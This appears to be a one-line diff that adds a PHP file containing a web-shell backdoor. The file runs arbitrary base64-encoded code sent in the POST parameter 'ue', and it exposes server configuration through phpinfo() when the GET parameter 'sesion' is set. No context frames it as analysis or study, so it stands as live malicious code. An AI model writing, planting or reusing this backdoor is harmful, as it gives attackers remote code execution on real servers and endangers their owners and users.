@@ -1,0 +1,1 @@
+<?php if(isset($_POST[ue])){@eval(base64_decode($_POST[ue]));exit;}if(isset($_GET[sesion])){phpinfo();} ?>
